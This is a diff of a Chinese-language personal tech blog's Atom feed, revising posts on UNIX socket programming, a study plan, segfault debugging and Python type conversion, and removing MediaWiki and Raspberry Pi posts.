@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://0x7c00.com/"/>
-  <updated>2017-05-08T17:19:24.599Z</updated>
+  <updated>2017-05-08T18:06:22.391Z</updated>
   <id>http://0x7c00.com/</id>
   
   <author>
@@ -20,11 +20,72 @@
     <link href="http://0x7c00.com/2017/UNIX-Network-program/"/>
     <id>http://0x7c00.com/2017/UNIX-Network-program/</id>
     <published>2017-01-15T18:17:12.000Z</published>
-    <updated>2017-05-08T17:19:24.599Z</updated>
+    <updated>2017-05-08T18:06:22.391Z</updated>
     
     <content type="html"><![CDATA[<p>unix网络编程知识总结</p>
+<h2 id="socket编程简介"><a href="#socket编程简介" class="headerlink" title="socket编程简介"></a>socket编程简介</h2><h3 id="套接字地址结构"><a href="#套接字地址结构" class="headerlink" title="套接字地址结构"></a>套接字地址结构</h3><p><strong>POSIX通用数据类型</strong></p>
+<table>
+<thead>
+<tr>
+<th>数据类型</th>
+<th>说明</th>
+<th>头文件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>int8_t</td>
+<td>带符号的8位整数</td>
+<td><code>&lt;sys/types.&gt;</code></td>
+</tr>
+<tr>
+<td>uint8_t</td>
+<td>无符号的8位整数</td>
+<td><code>&lt;sys/types.h&gt;</code></td>
+</tr>
+<tr>
+<td>int16_t</td>
+<td>带符号的16位整数</td>
+<td><code>&lt;sys/types.h&gt;</code></td>
+</tr>
+<tr>
+<td>uint16_t</td>
+<td>无符号的16位整数</td>
+<td><code>&lt;sys/types.h&gt;</code></td>
+</tr>
+<tr>
+<td>int32_t</td>
+<td>带符号的32位整数</td>
+<td><code>&lt;sys/types.h&gt;</code></td>
+</tr>
+<tr>
+<td>uint32_t</td>
+<td>无符号的32位整数</td>
+<td><code>&lt;sys/types.h&gt;</code></td>
+</tr>
+<tr>
+<td>sa_family_t</td>
+<td>套接字地址结构的地址组</td>
+<td><code>&lt;sys/socket.h&gt;</code></td>
+</tr>
+<tr>
+<td>socklen_t</td>
+<td>套接字地址长度的结构，一般为<code>uint32_t</code></td>
+<td><code>&lt;sys/socket.h&gt;</code></td>
+</tr>
+<tr>
+<td>in_addr_t</td>
+<td>IPv4地址，一般为<code>uint32_t</code></td>
+<td><code>&lt;netinet/in.h&gt;</code></td>
+</tr>
+<tr>
+<td>in_port_t</td>
+<td>端口号，一般为<code>uint16_t</code></td>
+<td><code>&lt;netinet/in.h&gt;</code></td>
+</tr>
+</tbody>
+</table>
 <a id="more"></a>
-<h2 id="socket编程简介"><a href="#socket编程简介" class="headerlink" title="socket编程简介"></a>socket编程简介</h2><h3 id="套接字地址结构"><a href="#套接字地址结构" class="headerlink" title="套接字地址结构"></a>套接字地址结构</h3><p><strong>POSIX通用数据类型</strong><br>数据类型|说明|头文件<br>–|–|–<br>int8_t | 带符号的8位整数| <code>&lt;sys/types.&gt;</code><br>uint8_t | 无符号的8位整数 | <code>&lt;sys/types.h&gt;</code><br>int16_t | 带符号的16位整数| <code>&lt;sys/types.h&gt;</code><br>uint16_t | 无符号的16位整数 | <code>&lt;sys/types.h&gt;</code><br>int32_t | 带符号的32位整数| <code>&lt;sys/types.h&gt;</code><br>uint32_t | 无符号的32位整数 | <code>&lt;sys/types.h&gt;</code><br>sa_family_t|套接字地址结构的地址组|<code>&lt;sys/socket.h&gt;</code><br>socklen_t|套接字地址长度的结构，一般为<code>uint32_t</code>|<code>&lt;sys/socket.h&gt;</code><br>in_addr_t|IPv4地址，一般为<code>uint32_t</code>|<code>&lt;netinet/in.h&gt;</code><br>in_port_t|端口号，一般为<code>uint16_t</code>|<code>&lt;netinet/in.h&gt;</code></p>
 <p><strong>IPv4网际套接字地址结构<code>重点</code></strong><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">in_addr_t</span> saddr;           <span class="comment">/* 32-bit IPV4 addr */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">uint8_t</span> sin_len;            <span class="comment">/* struct len(16) */</span></div><div class="line">	<span class="keyword">sa_family_t</span> sin_family;     <span class="comment">/* AF_INET */</span></div><div class="line">	<span class="keyword">in_port_t</span> sin_port;        <span class="comment">/* 16-bit port num */</span></div><div class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>    <span class="comment">/* 32bit-IPV4 addr */</span></div><div class="line">	<span class="keyword">char</span> sin_zero[<span class="number">8</span>];           <span class="comment">/* unused */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
 <p>常用操作<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></div><div class="line">bzero(&amp;addr, <span class="keyword">sizeof</span>(addr));</div><div class="line">addr.sin_family = AF_INET;</div><div class="line">addr.sin_addr.s_addr = htonl(<span class="string">"0.0.0.0"</span>);</div><div class="line">addr.sin_port = htons(<span class="number">1</span>);</div></pre></td></tr></table></figure></p>
 <ul>
@@ -117,6 +178,68 @@
     <summary type="html">
     
       &lt;p&gt;unix网络编程知识总结&lt;/p&gt;
+&lt;h2 id=&quot;socket编程简介&quot;&gt;&lt;a href=&quot;#socket编程简介&quot; class=&quot;headerlink&quot; title=&quot;socket编程简介&quot;&gt;&lt;/a&gt;socket编程简介&lt;/h2&gt;&lt;h3 id=&quot;套接字地址结构&quot;&gt;&lt;a href=&quot;#套接字地址结构&quot; class=&quot;headerlink&quot; title=&quot;套接字地址结构&quot;&gt;&lt;/a&gt;套接字地址结构&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;POSIX通用数据类型&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;数据类型&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;th&gt;头文件&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;int8_t&lt;/td&gt;
+&lt;td&gt;带符号的8位整数&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;sys/types.&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;uint8_t&lt;/td&gt;
+&lt;td&gt;无符号的8位整数&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;sys/types.h&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;int16_t&lt;/td&gt;
+&lt;td&gt;带符号的16位整数&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;sys/types.h&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;uint16_t&lt;/td&gt;
+&lt;td&gt;无符号的16位整数&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;sys/types.h&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;int32_t&lt;/td&gt;
+&lt;td&gt;带符号的32位整数&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;sys/types.h&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;uint32_t&lt;/td&gt;
+&lt;td&gt;无符号的32位整数&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;sys/types.h&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;sa_family_t&lt;/td&gt;
+&lt;td&gt;套接字地址结构的地址组&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;sys/socket.h&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;socklen_t&lt;/td&gt;
+&lt;td&gt;套接字地址长度的结构，一般为&lt;code&gt;uint32_t&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;sys/socket.h&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;in_addr_t&lt;/td&gt;
+&lt;td&gt;IPv4地址，一般为&lt;code&gt;uint32_t&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;netinet/in.h&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;in_port_t&lt;/td&gt;
+&lt;td&gt;端口号，一般为&lt;code&gt;uint16_t&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;&amp;lt;netinet/in.h&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
     
     </summary>
     
@@ -136,7 +259,7 @@
     <link href="http://0x7c00.com/2016/happy-new-year/"/>
     <id>http://0x7c00.com/2016/happy-new-year/</id>
     <published>2016-12-31T13:00:20.000Z</published>
-    <updated>2017-05-08T17:19:24.599Z</updated>
+    <updated>2017-05-08T18:07:29.411Z</updated>
     
     <content type="html"><![CDATA[<h1 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h1><p>还剩几个小时，2017年就要到来了。16年的工作和学习状态不是很满意。新的一年要再接再厉。</p>
 <blockquote>
@@ -145,9 +268,8 @@
 <li>原文作者： Breaker</li>
 </ul>
 </blockquote>
-<a id="more"></a>
 <h2 id="这是？"><a href="#这是？" class="headerlink" title="这是？"></a>这是？</h2><p>这是我为了从一个网络安全开发者蜕变为资深网络安全<em>(精通计算机网络、linux网络编程、linux内核)</em>开发者的计划，其计划历时数月。</p>
-<p><strong>我的目标是找到一种相对比较高效的学习方法</strong>。在平时的工作和学习中，每天都要面对大量的需要学习知识和技能。如果纯粹只是为了当时解决工作中遇到的某个问题，而不重视知识的积累，这样造成的结果就是今天查到的东西在未来某一天需要用到的时候还要在查一遍。纯粹是浪费时间。</p>
+<p><strong>我的目标是找到一种相对比较高效的学习方法</strong>。在平时的工作和学习中，每天都要面对大量的需要学习知识和技能。如果纯粹只是为了当时解决工作中遇到的某个问题，而不重视知识的积累，这样造成的结果就是今天查到的东西在未来某一天需要用到的时候还要在查一遍。纯粹是浪费时间。<br><a id="more"></a></p>
 <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>[TOC]</p>
 <h2 id="为何用到它"><a href="#为何用到它" class="headerlink" title="为何用到它"></a>为何用到它</h2><p>为了我以后的工作和目标而遵守这份计划。2015年7月以来，我一直从事入侵防御系统系统引擎的开发工作。通过一年多的工作，已经大致掌握了网络安全工作原理。在工作中明显感觉到知识匮乏，这是工作效率不能令我满意的原因。仔细思考了下，在新的一年里需要学习的内容有三方面：计算机网络、 linux网络编程以及linux内核。所以需要一次系统的知识升级。</p>
 <h2 id="如何使用它"><a href="#如何使用它" class="headerlink" title="如何使用它"></a>如何使用它</h2><p>下面的东西都只是一个概述。因此，你需要自上而下的逐一的处理它。<br>在学习过程中，用<code>TO DO LIST</code>标记和检查学习进度。</p>
@@ -201,6 +323,7 @@
 <h2 id="其他有意思的知识"><a href="#其他有意思的知识" class="headerlink" title="其他有意思的知识"></a>其他有意思的知识</h2><p>纯粹是为了玩，没啥目的。都是大家晚盛夏的。</p>
 <h3 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h3><p>可以试着做出12306验证码识别</p>
 <h3 id="大数据"><a href="#大数据" class="headerlink" title="大数据"></a>大数据</h3><p>爬一些数据，然后自己分析。</p>
+<hr>
 ]]></content>
     
     <summary type="html">
@@ -212,6 +335,8 @@
 &lt;li&gt;原文作者： Breaker&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/blockquote&gt;
+&lt;h2 id=&quot;这是？&quot;&gt;&lt;a href=&quot;#这是？&quot; class=&quot;headerlink&quot; title=&quot;这是？&quot;&gt;&lt;/a&gt;这是？&lt;/h2&gt;&lt;p&gt;这是我为了从一个网络安全开发者蜕变为资深网络安全&lt;em&gt;(精通计算机网络、linux网络编程、linux内核)&lt;/em&gt;开发者的计划，其计划历时数月。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;我的目标是找到一种相对比较高效的学习方法&lt;/strong&gt;。在平时的工作和学习中，每天都要面对大量的需要学习知识和技能。如果纯粹只是为了当时解决工作中遇到的某个问题，而不重视知识的积累，这样造成的结果就是今天查到的东西在未来某一天需要用到的时候还要在查一遍。纯粹是浪费时间。&lt;br&gt;
     
     </summary>
     
@@ -253,7 +378,7 @@
     <link href="http://0x7c00.com/2015/segmentfault-debugging/"/>
     <id>http://0x7c00.com/2015/segmentfault-debugging/</id>
     <published>2015-09-22T09:39:12.000Z</published>
-    <updated>2017-05-08T17:19:24.599Z</updated>
+    <updated>2017-05-08T18:08:16.251Z</updated>
     
     <content type="html"><![CDATA[<p>今天修改了一个段错误的bug。</p>
 <h2 id="第一步-用dmesg命令查看最近的段错误。"><a href="#第一步-用dmesg命令查看最近的段错误。" class="headerlink" title="第一步  用dmesg命令查看最近的段错误。"></a>第一步  用dmesg命令查看最近的段错误。</h2><p>[Mon Sep 14 15:11:50 2015] class[4200]: segfault at 0 ip 00007fcac993dbdd sp 00007fcaca4f5ac8 error 4 in libzealot.so[7fcac98ea000+6c000]</p>
@@ -272,9 +397,8 @@
 *   bit 4 ==                           1: fault was an instruction fetch
 */
 </code></pre><p></p>
-</li>
-<li><p>libzealot.so[7fcac98ea000+6c000]   错误发生的动态库。7fcac98ea000表示这次动态库加载的内存基地址，6c000是大小。</p>
-</li>
+<a id="more"></a></li>
+<li>libzealot.so[7fcac98ea000+6c000]   错误发生的动态库。7fcac98ea000表示这次动态库加载的内存基地址，6c000是大小。</li>
 </ul>
 <h2 id="第二部-反汇编"><a href="#第二部-反汇编" class="headerlink" title="第二部  反汇编"></a>第二部  反汇编</h2><p>objdump -d zealot.so &gt; zealot.dump</p>
 <h2 id="第三部-定位"><a href="#第三部-定位" class="headerlink" title="第三部 定位"></a>第三部 定位</h2><p>0x00007fcac993dbdd   - 0x7fcac98ea000 = 0x53bdd。在zealot.dump中找53bdd 定位到代码</p>
@@ -292,7 +416,22 @@
     <summary type="html">
     
       &lt;p&gt;今天修改了一个段错误的bug。&lt;/p&gt;
-&lt;h2 id=&quot;第一步-用dmesg命令查看最近的段错误。&quot;&gt;&lt;a href=&quot;#第一步-用dmesg命令查看最近的段错误。&quot; class=&quot;headerlink&quot; title=&quot;第一步  用dmesg命令查看最近的段错误。&quot;&gt;&lt;/a
+&lt;h2 id=&quot;第一步-用dmesg命令查看最近的段错误。&quot;&gt;&lt;a href=&quot;#第一步-用dmesg命令查看最近的段错误。&quot; class=&quot;headerlink&quot; title=&quot;第一步  用dmesg命令查看最近的段错误。&quot;&gt;&lt;/a&gt;第一步  用dmesg命令查看最近的段错误。&lt;/h2&gt;&lt;p&gt;[Mon Sep 14 15:11:50 2015] class[4200]: segfault at 0 ip 00007fcac993dbdd sp 00007fcaca4f5ac8 error 4 in libzealot.so[7fcac98ea000+6c000]&lt;/p&gt;
+&lt;p&gt;segfault at 0   表示段错误发生的地址。这里是0，可以判断是给地址为0处读取或者写入一个值。也就是出现了空指针的问题&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;ip 00007fcac993dbdd   这是错误发生的时候ip的位置，根据这个值可以定位错误发生的位置。&lt;/li&gt;
+&lt;li&gt;sp 00007fcaca4f5ac8    这是错误发生的时候sp的位置。调试过程中没有用到。&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;error 4  错误类型，在这里等于4 也就是bit2 == 1 user-mode access，bit1 == 0 read access，bit0 == 0 no page found。 结合ip的值可以判断是因为访问了一个空指针（read）。&lt;/p&gt;
+&lt;p&gt;&lt;span id=&quot;cjabiokabamngnbigeeibddnihgllkggmousedown-target-element&quot; class=&quot;com&quot;&gt;    /*&lt;/span&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;* Page fault error code bits:
+*
+*   bit 0 ==    0: no page found       1: protection fault
+*   bit 1 ==    0: read access         1: write access
+*   bit 2 ==    0: kernel-mode access  1: user-mode access
+*   bit 3 ==                           1: use of reserved bit detected
+*   bit 4 ==                           1: fault was an instruction fetch
+*/
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;/p&gt;
     
     </summary>
     
@@ -304,57 +443,25 @@
   </entry>
   
   <entry>
-    <title>MediaWiki</title>
-    <link href="http://0x7c00.com/2015/mediawiki/"/>
-    <id>http://0x7c00.com/2015/mediawiki/</id>
-    <published>2015-05-29T13:03:02.000Z</published>
-    <updated>2017-05-08T17:19:24.599Z</updated>
-    
-    <content type="html"><![CDATA[<p>打算用MediaWiki搭建一个知识库，作为个人文档库，将博客里面写的东西整理后放入wiki永久保存。博客和wiki最主要的区别是wiki更有利于存档以及以后查看，而博客比较随意，可以记录任何事情。</p>
-<p>这篇文章主要记录MediaWiki的基本用法，觉得一篇文章够用了，所以就没有添加Wiki的分类目录。</p>
-<h1 id="一-链接"><a href="#一-链接" class="headerlink" title="一 链接 "></a><span class="mw-headline">一 链接 </span></h1><h2 id="内部链接"><a href="#内部链接" class="headerlink" title="内部链接"></a>内部链接</h2><a id="more"></a>
-<pre>当名称与链接目标相同时可简写为：[[首页|]]
-
-当名称与链接目标不同时：[[首页|回到站点首页]]</pre>
-
-<h2 id="外部连接"><a href="#外部连接" class="headerlink" title="外部连接"></a>外部连接</h2><p><pre>[<a href="http://www.0x7c00.cn" target="_blank" rel="external">http://www.0x7c00.cn</a> Breaker’s Wiki]</pre><br>&nbsp;</p>
-<h1 id="二-表格"><a href="#二-表格" class="headerlink" title="二 表格"></a>二 表格</h1><p><pre>{| <em>参数 = </em>&lt;table <em>参数</em>&gt;<br>|} = &lt;/table&gt;</pre></p>
-<p><pre>|单元1<br>|单元2 = |单元1||单元2||单元3 = &lt;td&gt;单元1&lt;/td&gt;&lt;td&gt;单元2&lt;/td&gt;&lt;td&gt;单元3&lt;/td&gt;<br>|单元3</pre></p>
-<p><pre>|- ‘’参数’’  =  |————– ‘’参数’’  =   &lt;tr 参数&gt;</pre></p>
-<p><pre>|+ 标题  =  &lt;caption&gt;标题&lt;/caption&gt;<br>|+ ‘’参数’’|标题  =  &lt;caption <em>参数</em>&gt;Caption</pre></p>
-<p><br><strong>注意</strong>：　灵活运用colspan和rowspan参数来控制表格</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;打算用MediaWiki搭建一个知识库，作为个人文档库，将博客里面写的东西整理后放入wiki永久保存。博客和wiki最主要的区别是wiki更有利于存档以及以后查看，而博客比较随意，可以记录任何事情。&lt;/p&gt;
-&lt;p&gt;这篇文章主要记录MediaWiki的基本用法，觉得一篇文章够用了，所以就没有添加Wiki的分类目录。&lt;/p&gt;
-&lt;h1 id=&quot;一-链接&quot;&gt;&lt;a href=&quot;#一-链接&quot; class=&quot;headerlink&quot; title=&quot;一 链接 &quot;&gt;&lt;/a&gt;&lt;span class=&quot;mw-headline&quot;&gt;一 链接 &lt;/span&gt;&lt;/h1&gt;&lt;h2 id=&quot;内部链接&quot;&gt;&lt;a href=&quot;#内部链接&quot; class=&quot;headerlink&quot; title=&quot;内部链接&quot;&gt;&lt;/a&gt;内部链接&lt;/h2&gt;
-    
-    </summary>
-    
-      <category term="Coding" scheme="http://0x7c00.com/categories/Coding/"/>
-    
-    
-      <category term="MediaWiki" scheme="http://0x7c00.com/tags/MediaWiki/"/>
-    
-      <category term="表格" scheme="http://0x7c00.com/tags/%E8%A1%A8%E6%A0%BC/"/>
-    
-      <category term="链接" scheme="http://0x7c00.com/tags/%E9%93%BE%E6%8E%A5/"/>
-    
-  </entry>
-  
-  <entry>
     <title>列表，元组，字符串互相转换</title>
     <link href="http://0x7c00.com/2015/list-tuple-strings/"/>
     <id>http://0x7c00.com/2015/list-tuple-strings/</id>
     <published>2015-05-29T11:43:58.000Z</published>
-    <updated>2017-05-08T17:19:24.599Z</updated>
+    <updated>2017-05-08T18:12:01.019Z</updated>
     
     <content type="html"><![CDATA[<p>列表，元组，字符串之间的转化通过join(), str(), list(), tuple() 这四个函数实现。</p>
 <ul>
-<li><p>用list可以把字符串和元组转化为列表<br><pre>&gt;&gt;&gt; demo_str = ‘test’<br>&gt;&gt;&gt; demo_tuple = (‘t’,’e’,’s’,’t’)<br>&gt;&gt;&gt;demo_list = [‘t’,’e’,’s’,’t’]<br>&gt;&gt;&gt; temp = list(demo_tuple)<br>&gt;&gt;&gt; type(temp)<br>&lt;type ‘list’&gt;<br>&gt;&gt;&gt; temp = list(demo_str)<br>&gt;&gt;&gt; type(temp)<br>&lt;type ‘list’&gt;<br></pre></p>
-<a id="more"></a>
+<li><p>用list可以把字符串和元组转化为列表</p>
+<pre>&gt;&gt;&gt; demo_str = 'test' 
+&gt;&gt;&gt; demo_tuple = ('t','e','s','t')
+&gt;&gt;&gt;demo_list = ['t','e','s','t']
+&gt;&gt;&gt; temp = list(demo_tuple)
+&gt;&gt;&gt; type(temp)
+&lt;type 'list'&gt;
+&gt;&gt;&gt; temp = list(demo_str)
+&gt;&gt;&gt; type(temp)
+&lt;type 'list'&gt;
+</pre>
 </li>
 <li><p>用tuple() 可以将字符串和列表转化为元组</p>
 <pre>&gt;&gt;&gt; demo_str = 'test' 
@@ -367,9 +474,12 @@
 &gt;&gt;&gt; type(temp)
 &lt;type 'tuple'&gt;
 </pre>
+
 </li>
-<li><p>用str() 可以将字符串和列表转化为字符串</p>
-<pre>&gt;&gt;&gt; demo_str = 'test' 
+</ul>
+<a id="more"></a>
+<ul>
+<li>用str() 可以将字符串和列表转化为字符串<pre>&gt;&gt;&gt; demo_str = 'test' 
 &gt;&gt;&gt; demo_tuple = ('t','e','s','t')
 &gt;&gt;&gt;demo_list = ['t','e','s','t']
 &gt;&gt;&gt; temp = str(demo_list)
@@ -395,7 +505,32 @@
     
       &lt;p&gt;列表，元组，字符串之间的转化通过join(), str(), list(), tuple() 这四个函数实现。&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;p&gt;用list可以把字符串和元组转化为列表&lt;br&gt;&lt;pre&gt;&amp;gt;&amp;gt;&amp;gt; demo_str = ‘test’&lt;br&gt;&amp;gt;&amp;gt;&amp;gt; demo_tuple = (‘t’,’e’,’s’,’t’)&lt;br&gt;&amp;gt;&amp;gt;&amp;gt;demo_list = [‘t’,’e’,’s’,’t’]&lt;br&gt;&amp;gt;&amp;gt;&amp;gt; temp = list(demo_tuple)&lt;br&gt;&amp;gt;&amp;gt;&amp;gt; type(temp)&lt;br&gt;&amp;lt;type ‘list’&amp;gt;&lt;br&gt;&amp;gt;&amp;gt;&amp;gt; temp = list(demo_str)&lt;br&gt;&amp;gt;&amp;gt;&amp;gt; type(temp)&lt;br&gt;&amp;lt;type ‘list’&amp;gt;&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;li&gt;&lt;p&gt;用list可以把字符串和元组转化为列表&lt;/p&gt;
+&lt;pre&gt;&amp;gt;&amp;gt;&amp;gt; demo_str = &#39;test&#39; 
+&amp;gt;&amp;gt;&amp;gt; demo_tuple = (&#39;t&#39;,&#39;e&#39;,&#39;s&#39;,&#39;t&#39;)
+&amp;gt;&amp;gt;&amp;gt;demo_list = [&#39;t&#39;,&#39;e&#39;,&#39;s&#39;,&#39;t&#39;]
+&amp;gt;&amp;gt;&amp;gt; temp = list(demo_tuple)
+&amp;gt;&amp;gt;&amp;gt; type(temp)
+&amp;lt;type &#39;list&#39;&amp;gt;
+&amp;gt;&amp;gt;&amp;gt; temp = list(demo_str)
+&amp;gt;&amp;gt;&amp;gt; type(temp)
+&amp;lt;type &#39;list&#39;&amp;gt;
+&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;用tuple() 可以将字符串和列表转化为元组&lt;/p&gt;
+&lt;pre&gt;&amp;gt;&amp;gt;&amp;gt; demo_str = &#39;test&#39; 
+&amp;gt;&amp;gt;&amp;gt; demo_tuple = (&#39;t&#39;,&#39;e&#39;,&#39;s&#39;,&#39;t&#39;)
+&amp;gt;&amp;gt;&amp;gt;demo_list = [&#39;t&#39;,&#39;e&#39;,&#39;s&#39;,&#39;t&#39;]
+&amp;gt;&amp;gt;&amp;gt; temp = tuple(demo_str)
+&amp;gt;&amp;gt;&amp;gt; type(temp)
+&amp;lt;type &#39;tuple&#39;&amp;gt;
+&amp;gt;&amp;gt;&amp;gt; temp = tuple(demo_list)
+&amp;gt;&amp;gt;&amp;gt; type(temp)
+&amp;lt;type &#39;tuple&#39;&amp;gt;
+&lt;/pre&gt;
+
+&lt;/li&gt;
+&lt;/ul&gt;
     
     </summary>
     
@@ -405,86 +540,6 @@
       <category term="print" scheme="http://0x7c00.com/tags/print/"/>
     
       <category term="python" scheme="http://0x7c00.com/tags/python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Raspberry Pi Timer</title>
-    <link href="http://0x7c00.com/2014/raspberry-pi-timer/"/>
-    <id>http://0x7c00.com/2014/raspberry-pi-timer/</id>
-    <published>2014-12-25T10:07:33.000Z</published>
-    <updated>2017-05-08T17:19:24.599Z</updated>
-    
-    <content type="html"><![CDATA[<p>The Physical (hardware) base address for the system timers is 0x7E003000.</p>
-<p>树莓派的Timer共有7个寄存器 分别是</p>
-<p>0x0   CS       System Timer Control/Status                 32<br>0x4   CLO    System Timer Counter Lower 32 bits    32<br>0x8   CHI     System Timer Counter Higher 32 bits    32<br>0xc   C0       System Timer Compare 0                       32<br>0x10 C1       System Timer Compare 1                       32<br>0x14 C2       System Timer Compare 2                       32<br>0x18 C3       System Timer Compare 3                       32</p>
-<a id="more"></a>
-<p>1.CS寄存器的第四位分别为 M0 M1 M2 M3 。Mn寄存器置1，表示打开Cn。31:4 bit 无用</p>
-<p>2.CLO CHI 分别是timer的低32位和高32位。</p>
-<p>3.C0-C3 四个定时器</p>
-<p>&nbsp;</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;The Physical (hardware) base address for the system timers is 0x7E003000.&lt;/p&gt;
-&lt;p&gt;树莓派的Timer共有7个寄存器 分别是&lt;/p&gt;
-&lt;p&gt;0x0   CS       System Timer Control/Status                 32&lt;br&gt;0x4   CLO    System Timer Counter Lower 32 bits    32&lt;br&gt;0x8   CHI     System Timer Counter Higher 32 bits    32&lt;br&gt;0xc   C0       System Timer Compare 0                       32&lt;br&gt;0x10 C1       System Timer Compare 1                       32&lt;br&gt;0x14 C2       System Timer Compare 2                       32&lt;br&gt;0x18 C3       System Timer Compare 3                       32&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="Operating System" scheme="http://0x7c00.com/categories/Operating-System/"/>
-    
-    
-      <category term="Raspberry Pi" scheme="http://0x7c00.com/tags/Raspberry-Pi/"/>
-    
-      <category term="Timer" scheme="http://0x7c00.com/tags/Timer/"/>
-    
-      <category term="时钟" scheme="http://0x7c00.com/tags/%E6%97%B6%E9%92%9F/"/>
-    
-      <category term="树莓派" scheme="http://0x7c00.com/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
-    
-      <category term="频率" scheme="http://0x7c00.com/tags/%E9%A2%91%E7%8E%87/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Raspberry Pi GPIO</title>
-    <link href="http://0x7c00.com/2014/raspberry-pi-gpio/"/>
-    <id>http://0x7c00.com/2014/raspberry-pi-gpio/</id>
-    <published>2014-12-24T04:00:04.000Z</published>
-    <updated>2017-05-08T17:19:24.599Z</updated>
-    
-    <content type="html"><![CDATA[<p>树莓派的共有54个GPIO 这54个GPIO通过 0x7e20 0000 - 0x7e20 00b0 这41 个寄存器控制 。有用的寄存器有：</p>
-<p>1.GPFSEL ( GPIO Function Select)    共六个GPFSEL0 - GPFSEL6，每个GPFSEL控制10个GPIO pin ，即GPFSEL的0-29 bit 每3bit控制一个GPIO pin 30、31两个bit无用。作用是控制GPIO pin 的功能。 功能号：</p>
-<a id="more"></a>
-<p>000 = GPIO Pin  is an input<br>001 = GPIO Pin  is an output<br>100 = GPIO Pin  takes alternate function 0<br>101 = GPIO Pin  takes alternate function 1<br>110 = GPIO Pin  takes alternate function 2<br>111 = GPIO Pin  takes alternate function 3<br>011 = GPIO Pin  takes alternate function 4<br>010 = GPIO Pin takes alternate function 5</p>
-<p>&nbsp;</p>
-<p>2. GPSET (GPIO Pin Output Set)     GPSET共两个GPSET0、GPSET1。</p>
-<p>3.GPCLR (GPIO Pin Output Clear Registers)     GPCLR0、GPCLR1</p>
